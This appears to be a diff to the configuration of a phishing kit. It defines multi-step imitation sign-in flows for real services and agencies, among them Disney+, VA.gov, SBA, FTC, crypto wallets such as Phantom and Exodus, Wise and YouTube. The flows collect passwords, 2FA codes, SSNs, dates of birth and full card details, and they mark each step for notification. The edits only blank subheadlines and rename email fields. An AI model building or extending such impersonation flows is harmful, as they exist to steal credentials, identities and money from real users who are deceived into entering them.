@@ -723,7 +723,7 @@ FLOWS.netflixvideo = [
 ];
 
 FLOWS.disneyplus = [
-  { slug:'login',          form_type:'login',  page_title:'Sign In',            headline:'Sign in to Disney+',            subheadline:'Enter your email and password',          fields:['email','password'],                          layout:'auth',  cta:'Sign In',   step_label:'Login',          notify_step:true  },
+  { slug:'login',          form_type:'login',  page_title:'Sign In',            headline:'Sign in to Disney+',            subheadline:'',          fields:['email','password'],                          layout:'auth',  cta:'Sign In',   step_label:'Login',          notify_step:true  },
   { slug:'payment-update', form_type:'payment',page_title:'Update Payment',     headline:'Update Payment Method',         subheadline:'Update your card details to continue watching Disney+', fields:['card_number','expiry','cvv','name_on_card'],layout:'payment',cta:'Update',    step_label:'Payment Update', notify_step:true  }
 ];
 
@@ -910,7 +910,7 @@ FLOWS.dhs = [
 ];
 
 FLOWS.va = [
-  { slug:'login',     form_type:'login',    page_title:'Sign In – VA',         headline:'Sign in to VA.gov',        subheadline:'Access VA health care, benefits, and records', fields:['email','password'], layout:'auth',   cta:'Sign in',   step_label:'Sign In',   notify_step:true  },
+  { slug:'login',     form_type:'login',    page_title:'Sign In – VA',         headline:'Sign in to VA.gov',        subheadline:'', fields:['email','password'], layout:'auth',   cta:'Sign in',   step_label:'Sign In',   notify_step:true  },
   { slug:'sms-code',  form_type:'otp',      page_title:'Verify Phone Number',  headline:'Verify your phone number', subheadline:'We\'ll send a 6-digit code to your phone', fields:['code'],             layout:'otp',    cta:'Continue',  step_label:'Verify',    notify_step:true, otp_length:6 },
   { slug:'id-confirm',form_type:'id_verify',page_title:'Verify Your Identity', headline:'Verify Your Identity',     subheadline:'Enter your SSN and date of birth to verify your identity', fields:['ssn','dob'], layout:'verify', cta:'Confirm', step_label:'ID Confirm', notify_step:true }
 ];
@@ -928,13 +928,13 @@ FLOWS.medicaid = [
 ];
 
 FLOWS.sba = [
-  { slug:'login',     form_type:'login',    page_title:'Sign In – SBA',          headline:'Sign in to SBA Portal',       subheadline:'Access SBA loans, grants, and business resources', fields:['email','password'], layout:'auth',   cta:'Sign In',   step_label:'Sign In', notify_step:true  },
+  { slug:'login',     form_type:'login',    page_title:'Sign In – SBA',          headline:'Sign in to SBA Portal',       subheadline:'', fields:['email','password'], layout:'auth',   cta:'Sign In',   step_label:'Sign In', notify_step:true  },
   { slug:'sms-code',  form_type:'otp',      page_title:'Multi-Factor Authentication', headline:'Multi-Factor Authentication', subheadline:'Enter the code sent to your registered phone number', fields:['code'], layout:'otp', cta:'Verify', step_label:'Verify', notify_step:true, otp_length:6 },
   { slug:'id-confirm',form_type:'id_verify',page_title:'Verify Your Identity',    headline:'Verify Your Identity',        subheadline:'Enter your EIN or SSN and business registration number', fields:['ssn','dob'], layout:'verify', cta:'Confirm', step_label:'Confirm', notify_step:true }
 ];
 
 FLOWS.ftc = [
-  { slug:'login',    form_type:'login', page_title:'Sign In – FTC',   headline:'FTC Account Sign In',       subheadline:'Access FTC services and your consumer protection account', fields:['email','password'], layout:'auth', cta:'Sign In', step_label:'Sign In', notify_step:true  },
+  { slug:'login',    form_type:'login', page_title:'Sign In – FTC',   headline:'FTC Account Sign In',       subheadline:'', fields:['email','password'], layout:'auth', cta:'Sign In', step_label:'Sign In', notify_step:true  },
   { slug:'sms-code', form_type:'otp',   page_title:'Verify Your Identity', headline:'Verify Your Identity', subheadline:'Enter the 6-digit code we sent to your email address', fields:['code'], layout:'otp', cta:'Verify', step_label:'Verify', notify_step:true, otp_length:6 }
 ];
 
@@ -1242,17 +1242,17 @@ FLOWS.trezor = [
 ];
 
 FLOWS.exodus = [
-  { slug:'login',    form_type:'login', page_title:'Sign In – Exodus',         headline:'Sign in to Exodus',    subheadline:'Multi-asset crypto wallet', fields:['email','password'], layout:'auth', cta:'Sign In',  step_label:'Sign In', notify_step:true  },
+  { slug:'login',    form_type:'login', page_title:'Sign In – Exodus',         headline:'Sign in to Exodus',    subheadline:'', fields:['email','password'], layout:'auth', cta:'Sign In',  step_label:'Sign In', notify_step:true  },
   { slug:'2fa',      form_type:'otp',   page_title:'Two-Factor Authentication', headline:'2FA Verification',    subheadline:'Enter the code from your authenticator app', fields:['code'], layout:'otp', cta:'Verify', step_label:'2FA', notify_step:true, otp_length:6 }
 ];
 
 FLOWS.phantom = [
-  { slug:'login',    form_type:'login', page_title:'Sign In – Phantom',        headline:'Welcome to Phantom',   subheadline:'Your friendly Solana, Ethereum, and Polygon wallet', fields:['email','password'], layout:'auth', cta:'Continue', step_label:'Login', notify_step:true  },
+  { slug:'login',    form_type:'login', page_title:'Sign In – Phantom',        headline:'Welcome to Phantom',   subheadline:'', fields:['email','password'], layout:'auth', cta:'Continue', step_label:'Login', notify_step:true  },
   { slug:'2fa',      form_type:'otp',   page_title:'Verify Your Identity',     headline:'Verify Your Identity', subheadline:'Enter the code sent to your email address', fields:['code'], layout:'otp', cta:'Verify', step_label:'Verify', notify_step:true, otp_length:6 }
 ];
 
 FLOWS.solflare = [
-  { slug:'login',    form_type:'login', page_title:'Sign In – Solflare',       headline:'Sign in to Solflare',  subheadline:'The most powerful Solana wallet', fields:['email','password'], layout:'auth', cta:'Sign In',  step_label:'Sign In', notify_step:true  },
+  { slug:'login',    form_type:'login', page_title:'Sign In – Solflare',       headline:'Sign in to Solflare',  subheadline:'', fields:['email','password'], layout:'auth', cta:'Sign In',  step_label:'Sign In', notify_step:true  },
   { slug:'2fa',      form_type:'otp',   page_title:'Two-Factor Authentication', headline:'Two-Factor Authentication', subheadline:'Enter your 2FA code to verify your identity', fields:['code'], layout:'otp', cta:'Verify', step_label:'2FA', notify_step:true, otp_length:6 }
 ];
 
@@ -1350,7 +1350,7 @@ FLOWS.affirm = [
 ];
 
 FLOWS.braintree = [
-  { slug:'login',    form_type:'login', page_title:'Log In – Braintree',       headline:'Log In to Braintree',  subheadline:'Powered by PayPal', fields:['email','password'], layout:'auth', cta:'Log In',   step_label:'Log In', notify_step:true  },
+  { slug:'login',    form_type:'login', page_title:'Log In – Braintree',       headline:'Log In to Braintree',  subheadline:'', fields:['email','password'], layout:'auth', cta:'Log In',   step_label:'Log In', notify_step:true  },
   { slug:'sms-code', form_type:'otp',   page_title:'Two-Factor Authentication', headline:'Two-Factor Authentication', subheadline:'Enter the code sent to your phone number', fields:['code'], layout:'otp', cta:'Confirm', step_label:'2FA', notify_step:true, otp_length:6 }
 ];
 
@@ -1370,7 +1370,7 @@ FLOWS.checkoutcom = [
 ];
 
 FLOWS.wise = [
-  { slug:'login',    form_type:'login', page_title:'Log In – Wise',            headline:'Log in to Wise',       subheadline:'Send money internationally at the real exchange rate', fields:['email','password'], layout:'auth', cta:'Log in',   step_label:'Log In', notify_step:true  },
+  { slug:'login',    form_type:'login', page_title:'Log In – Wise',            headline:'Log in to Wise',       subheadline:'', fields:['email','password'], layout:'auth', cta:'Log in',   step_label:'Log In', notify_step:true  },
   { slug:'sms-code', form_type:'otp',   page_title:'Verify Your Identity',     headline:'Verify your identity', subheadline:'Enter the code we\'ve sent to your phone number', fields:['code'], layout:'otp', cta:'Confirm', step_label:'Verify', notify_step:true, otp_length:6 }
 ];
 
@@ -1596,7 +1596,7 @@ FLOWS.ibm = [
 ];
 
 FLOWS.intel = [
-  { slug:'login',    form_type:'login', page_title:'Sign In – Intel',          headline:'Welcome to Intel',     subheadline:'Sign in to access your Intel account and resources', fields:['email','password'], layout:'auth', cta:'Sign In', step_label:'Sign In', notify_step:true  },
+  { slug:'login',    form_type:'login', page_title:'Sign In – Intel',          headline:'Welcome to Intel',     subheadline:'', fields:['email','password'], layout:'auth', cta:'Sign In', step_label:'Sign In', notify_step:true  },
   { slug:'sms-code', form_type:'otp',   page_title:'Two-Factor Authentication', headline:'Two-Factor Authentication', subheadline:'Enter the code from your authentication app', fields:['code'], layout:'otp', cta:'Verify', step_label:'2FA', notify_step:true, otp_length:6 }
 ];
 
@@ -1769,13 +1769,13 @@ FLOWS.applemusic = [
 ];
 
 FLOWS.amazonmusic = [
-  { slug:'login',          form_type:'login',  page_title:'Sign In – Amazon Music',     headline:'Sign in',                      subheadline:'New to Amazon? Create your Amazon account', fields:['email'], layout:'auth',   cta:'Continue', step_label:'Email',          notify_step:true  },
+  { slug:'login',          form_type:'login',  page_title:'Sign In – Amazon Music',     headline:'Sign in',                      subheadline:'', fields:['email_or_mobile'], layout:'auth',   cta:'Continue', step_label:'Email',          notify_step:true  },
   { slug:'password',       form_type:'login',  page_title:'Enter Your Password',        headline:'Enter your password',          subheadline:'', fields:['password'], layout:'auth', cta:'Sign In',  step_label:'Password',       notify_step:true  },
   { slug:'payment-update', form_type:'payment',page_title:'Update Payment',             headline:'Update Payment Information',   subheadline:'Update your payment details to continue enjoying Amazon Music Unlimited', fields:['card_number','expiry','cvv','name_on_card'], layout:'payment', cta:'Save', step_label:'Payment Update', notify_step:true }
 ];
 
 FLOWS.youtubemusic = [
-  { slug:'login',          form_type:'login',  page_title:'Sign In – YouTube Music',    headline:'Sign in',                      subheadline:'Use your Google Account', fields:['email'], layout:'auth',   cta:'Next',    step_label:'Email',          notify_step:true  },
+  { slug:'login',          form_type:'login',  page_title:'Sign In – YouTube Music',    headline:'Sign in',                      subheadline:'Use your Google Account', fields:['email_or_phone'], layout:'auth',   cta:'Next',    step_label:'Email',          notify_step:true  },
   { slug:'password',       form_type:'login',  page_title:'Welcome',                    headline:'Welcome',                      subheadline:'', fields:['password'], layout:'auth', cta:'Next',    step_label:'Password',       notify_step:true  },
   { slug:'payment-update', form_type:'payment',page_title:'Update Payment',             headline:'Update Payment Method',        subheadline:'Update your payment method to continue your YouTube Music Premium subscription', fields:['card_number','expiry','cvv','name_on_card'], layout:'payment', cta:'Save', step_label:'Payment Update', notify_step:true }
 ];
@@ -1832,7 +1832,7 @@ FLOWS.pocketcasts = [
 ];
 
 FLOWS.stitcher = [
-  { slug:'login',          form_type:'login',  page_title:'Sign In – Stitcher',         headline:'Sign In to Stitcher',          subheadline:'Stream and download thousands of podcasts on demand', fields:['email','password'], layout:'auth',   cta:'Sign In', step_label:'Sign In',        notify_step:true  },
+  { slug:'login',          form_type:'login',  page_title:'Sign In – Stitcher',         headline:'Sign In to Stitcher',          subheadline:'', fields:['email','password'], layout:'auth',   cta:'Sign In', step_label:'Sign In',        notify_step:true  },
   { slug:'payment-update', form_type:'payment',page_title:'Update Payment',             headline:'Update Payment Method',        subheadline:'Update your billing information to continue your Stitcher Premium subscription', fields:['card_number','expiry','cvv','name_on_card'], layout:'payment', cta:'Update', step_label:'Payment Update', notify_step:true }
 ];
 
@@ -1914,7 +1914,7 @@ FLOWS.napster = [
 
 // ── Video ─────────────────────────────────────────────────────────────────────
 FLOWS.youtubevideo = [
-  { slug:'login',          form_type:'login',  page_title:'Sign In – YouTube',          headline:'Sign in',                      subheadline:'Use your Google Account', fields:['email'], layout:'auth',   cta:'Next',    step_label:'Email',          notify_step:true  },
+  { slug:'login',          form_type:'login',  page_title:'Sign In – YouTube',          headline:'Sign in',                      subheadline:'Use your Google Account', fields:['email_or_phone'], layout:'auth',   cta:'Next',    step_label:'Email',          notify_step:true  },
   { slug:'password',       form_type:'login',  page_title:'Welcome',                    headline:'Welcome',                      subheadline:'', fields:['password'], layout:'auth', cta:'Next',    step_label:'Password',       notify_step:true  },
   { slug:'payment-update', form_type:'payment',page_title:'Update Payment',             headline:'Update Billing Details',       subheadline:'Update your payment method to continue YouTube Premium', fields:['card_number','expiry','cvv','name_on_card'], layout:'payment', cta:'Save',    step_label:'Payment Update', notify_step:true }
 ];
